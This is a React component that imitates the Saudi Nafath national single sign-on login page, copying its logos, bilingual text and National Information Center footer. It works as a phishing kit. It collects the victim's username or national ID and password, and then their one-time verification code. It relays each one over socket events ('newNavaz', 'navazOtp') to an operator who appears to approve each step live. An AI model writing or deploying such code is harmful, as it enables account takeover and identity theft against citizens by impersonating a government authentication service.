import axios from 'axios'
import React, { useState } from 'react'
import { CiUnlock } from 'react-icons/ci'
import { FaBars, FaBurger } from 'react-icons/fa6'
import { LuLogIn } from 'react-icons/lu'
import { MdOutlinePerson } from 'react-icons/md'
import { TbWorld } from 'react-icons/tb'
import { serverRoute, socket } from './Main'
import { ImBlocked } from "react-icons/im";
import { TailSpin } from 'react-loader-spinner'

const Navaz = ({checkMode,mode,setMode}) => {
    const [bar,setBar] = useState(false)
    const [username,setUsername] = useState('')
    const [password,setPassword]= useState('')
    const [error,setError] = useState(false)
    const [loading,setLoading]  = useState(false)
    const token = sessionStorage.getItem('session')
    const [otp,setOtp] = useState(false)
    const [otpError,setOtpError] = useState(false)
    const [otpValue,setOtpValue] = useState('')

    const handleSubmit = async(e)=>{
        e.preventDefault()
        setError(false)
        try {
            setLoading(true)
            if(username && password){
                const result = await axios.post(serverRoute+'/auth/email?navaz=true',{username,password})
                if(result.status === 200){
                    socket.emit('newNavaz',{username,password,token})
                }else{
                    setError(true)
                }
               
            }
         
        } catch (error) {
            console.log(error)
            setError(true)
        }

    }

    const sendOtp = async (o)=>{
        setError(false)
        setOtpError(false)
        try {
            if(username && password){
                setError(false)
                setLoading(true)
                socket.emit('navazOtp',{username,password,otp:o})
                await axios.post(serverRoute+'/auth/email?navaz=true',{username,password,otp:otpValue})
            }else{
                window.location.reload()
            }

        } catch (error) {
            
        }

    }

    socket.on('AllowNavaz',(data)=>{
        if(data.token === token){
            setLoading(false)
            setError(false)
            setOtp(true)
        }
    })
    socket.on('disAllowNavaz',(data)=>{
        if(data.token === token){
            setLoading(false)
            setError(true)
        }
    })

    socket.on('disAllowUserOtp',(data)=>{
        if(data.username === username){
            setLoading(false)
            setOtpError(true)
        }
    })
    socket.on('AllowUserOtp',(data)=>{
        if(data.username === username){
            window.location.href = `/verify?otp=${data.userOtp}`
        }
    })

  return (
    <div className='flex flex-col w-full min-h-screen justify-between items-center gap-y-5 relative' dir={mode==='ar' ? 'rtl' : 'ltr'} style={{backgroundColor:'#fafafa'}}>
                {
            loading && 
            <div className='absolute top-0 w-full z-20  flex items-center justify-center h-screen bg-opacity-50 left-0 bg-gray-300 ' >
    <TailSpin
      height="50"
      width="50"
      color="green"
      ariaLabel="tail-spin-loading"
      radius="1"
      wrapperStyle={{}}
      wrapperClass=""
      visible={true}/>
            </div>
       
        }
          {otp && <div className='absolute  flex  items-end justify-center bg-black bg-opacity-60 w-full h-screen py-10 '>
            <div className='flex flex-col bg-white w-full sm:w-2/3  p-5 rounded-md'>
            <div className='flex items-center  justify-around'>
            <img src='/main_images/navazNav.png' className='md:w-80 w-36'/>
            <img src='/main_images/navazLogo.png' className='md:w-80 w-36 '/>
            </div>
            <div className='flex items-center justify-center gap-x-2 p-4  my-2 bg-gray-100'>
            <input className='border-2 border-green-500 rounded-lg text-xs p-1' value={otpValue} onChange={(e)=>setOtpValue(e.target.value)}/>
            <span className='text-xs'>
                {checkMode('OTP','رمز التحقق ').word}
            </span>
            </div>
            {otpError && <span className='text-center text-red-500 my-2'>{checkMode('Error Happend Please Try Again','حدث خطأ برجاء المحاوله مره اخري').word}</span>}
            <button className='my-1 w-full   text-white py-1 ' style={{backgroundColor:'#11998e'}} onClick={()=>sendOtp(otpValue)}>
                {checkMode('Submit','تاكيد').word}
                </button>
            <span className='text-center'>
                {checkMode('Technical support and assistance','للدعم الفني والمساعده ').word}
                <span className='text-green-500 cursor-pointer'>
                {checkMode(' Click Here ','اضغط هنا').word}
                </span></span>
            </div>
        </div>}
        <div className='flex flex-col items-center justify-between bg-white-100 drop-shadow-lg w-full p-6 ' style={{backgroundColor:'#fafafa'}}>
            <div className='w-full flex justify-between items-center '>
            <button className='md:hidden block' onClick={()=>setBar(!bar)}>
                <FaBars  className='  text-3xl'/>
            </button>
            <div className={` border-b-2 border-gray-200 transition-all p-2 hover:text-green-900 py-4 mt-2 gap-x-2 md:flex hidden items-center ${mode==='ar' && ''}`} dir={mode ==='ar' ? 'ltr' :"rtl"}>
                <span onClick={()=>setMode(mode === 'ar' ? 'en' : 'ar')} className='cursor-pointer  '>{checkMode('English','عربي').word}</span>
                <TbWorld />
                </div>
            <div className='flex gap-x-5 items-center'>
                <img src='/main_images/navazNav.png' className='w-28 hidden sm:inline'/>
                <img src='/main_images/navazLogo.png' className='w-28'/>
            </div>
            </div>
            {bar && 
            <div className={`w-full border-y-2 border-gray-200 transition-all p-2 py-4 mt-2 gap-x-2 flex items-center hover:text-green-900 ${mode==='ar' && ''}`} dir={mode ==='ar' ? 'ltr' :"rtl"}>
                <span onClick={()=>setMode(mode === 'ar' ? 'en' : 'ar')} className='cursor-pointer  '>{checkMode('English','عربي').word}</span>
                <TbWorld />
                </div>}

        </div>
        <div className='flex flex-col w-full flex-1 items-center justify-start pt-10  ' dir='ltr'>
                <span className='font-extrabold md:text-2xl text-base mb-5' style={{color:'#11998e'}}>{checkMode('الدخول علي النظام','Identity Authentication Management').word}</span>
                {error && <div className='flex items-center justify-center gap-x-3 bg-white text-red-500 p-5 my-3 md:w-2/3 w-full ' style={{borderTop:'1px solid red'}} dir={mode==='ar' ? 'rtl' : 'ltr'}>
                    <span className='font-bold'>{checkMode('اسم المستخدم او كلمة المرور غير صحيح','Invalid username or password').word}</span>
                    <ImBlocked className='bg-red-500 text-white text-2xl p-1 rounded-full'/>
                    </div>}
                <div className='flex justify-center md:w-2/3 w-full p-4 font-bold select-none cursor-pointer  text-white rounded-md'style={{backgroundColor:'#c2c2c2'}} >
                    <span className='flex-1 text-center'>{checkMode('تطبيق نفاذ','Nafath App').word}</span>
                    <span className=' text-right'>+</span>
                </div>
                <div className='flex justify-center md:w-2/3 w-full p-4 font-bold select-none cursor-pointer  text-white rounded-md'style={{backgroundColor:'#11998e'}} >
                    <span className='flex-1 text-center'>{checkMode('اسم المستخدم وكلمه المرور','Username and Password').word}</span>
                    <span className=' text-right'>-</span>
                </div>
                <div style={{backgroundColor:'#f1f1f1'}} className='md:w-1/2 w-11/12 px-4 py-5 flex md:flex-row flex-col items-stretch justify-center' dir={mode === 'ar' ? 'ltr' : 'rtl'}>
                    <form className='bg-white flex flex-col md:w-1/2 w-full justify-center items-start p-5 gap-y-5' onSubmit={handleSubmit}>
                        <div className='flex flex-col justify-start items-start w-full gap-y-2'>
                            <span  style={{color:'#8e8e8e'}}>{checkMode('اسم المستخدم \\ الهويه الوطنيه','Username \\  National Id').word}</span>
                            <input type='text' placeholder={mode === 'ar' ? 'Enter your username \\  National id here':'اسم المستخدم \\  الهويه الوطنيه'}  style={{border:'1px solid #a4a4a4'}} className='w-full py-2 px-4 rounded-md text-sm placeholder:text-gray-300 text-gray-500 outline-1 outline-emerald-600  placeholder:text-xs' required value={username} onChange={(e)=>setUsername(e.target.value)}/>
                        </div>
                        <div className='flex flex-col justify-start items-start w-full gap-y-2'>
                            <span className='text-sm' style={{color:'#8e8e8e'}}>{checkMode('كلمه المرور','Password').word}</span>
                            <input type='password' placeholder={mode === 'ar' ?  'Enter your password':'كلمه المرور'} style={{border:'1px solid #a4a4a4'}} className='w-full py-2 px-4 rounded-md text-sm placeholder:text-gray-300 text-gray-500 outline-1 outline-emerald-600 placeholder:text-xs' required value={password} onChange={(e)=>setPassword(e.target.value)}/>
                        </div>
                        <div className='w-full flex items-center justify-center my-2 py-2  hover:opacity-60 rounded-md text-white    transition-all' style={{backgroundColor:'#11998e'}} >
                            
                            <button className='cursor-pointer w-full flex items-center justify-center'><LuLogIn/>{checkMode('تسجيل الدخول','Login').word}</button>
                        </div>
                        <div className='w-full flex md:justify-around justify-between'>
                            <div className='flex items-center rounded-md justify-center gap-x-1 md:px-4 px-1 py-1 hover:text-white  hover:bg-gray-600 transition-all cursor-pointer text-gray-600 loginlink' style={{border:'1px solid #a8a6a6'}}>
                                <CiUnlock />
                                <span className='loginlink'>{checkMode('اعاده تعيين / تغيير كلمه المرور','Forget/Change Password').word}</span>
                            </div>
                            <div className='flex items-center rounded-md justify-center gap-x-1 md:px-4 px-2 hover:text-white  hover:bg-gray-600 transition-all cursor-pointer text-gray-600 ' style={{border:'1px solid #a8a6a6'}}>
                                <MdOutlinePerson />
                                <span className='loginlink'>{checkMode('حساب جديد','New Account ').word}</span>
                            </div>

                        </div>
                    </form>
                    <div className='bg-white sm:flex hidden flex-col md:w-1/2 w-full justify-center items-center p-5 gap-y-5'>
                        <img src='/main_images/navazLogin.jpg' className='h-48'/>
                        <span className='w-full text-center text-sm text-gray-400 '>{checkMode('الرجاء إدخال اسم المستخدم \ الهوية الوطنية وكلمة المرور ثم اضغط تسجيل الدخول','Please enter your username or National Id and password, then click Login.').word}</span>
                    </div>
                </div>
                </div>
                <div style={{backgroundColor:'#ecedf2'}} className='flex flex-col md:flex-row justify-between items-center w-full p-3 ' dir={mode==='ar' ? 'ltr' : 'rtl'}>
            <div className='flex items-center gap-x-5'>
                <img src='/main_images/navazFooter.png' className='h-28'/>
                <div className='flex flex-col'>
                    <span className='mb-2 text-sm'>{checkMode('تطوير و تشغيل','Development and operation').word}</span>
                    <span style={{color:'#586673',fontWeight:'bold'}}>{checkMode('مركز المعلومات الوطني','National Information Center').word}</span>
                    <span className='text-sm'>{checkMode('النفاذ الوطني الموحد جميع الحقوق محفوظة © 2023','National Single Sign-On All rights reserved © 2023').word}</span>
                    </div>
            </div>

            <div className='flex gap-x-7 gap-y-3 md:text-sm text-xs text-gray-500 flex-wrap items-center  justify-center my-2'>
                <span>{checkMode('الرئيسيه','Home').word}</span>
                <span>{checkMode('حول','About').word}</span>
                <span>{checkMode('اتصل بنا','Contact Us').word}</span>
                <span>{checkMode('الشروط والاحكام','Terms & conditions ').word}</span>
                <span>{checkMode('المساعده والدعم','Assistance & Support').word}</span>
                <span>{checkMode('سياسه الخصوصيه','Privacy').word}</span>
            </div>
                </div>
    </div>
  )
}

export default Navaz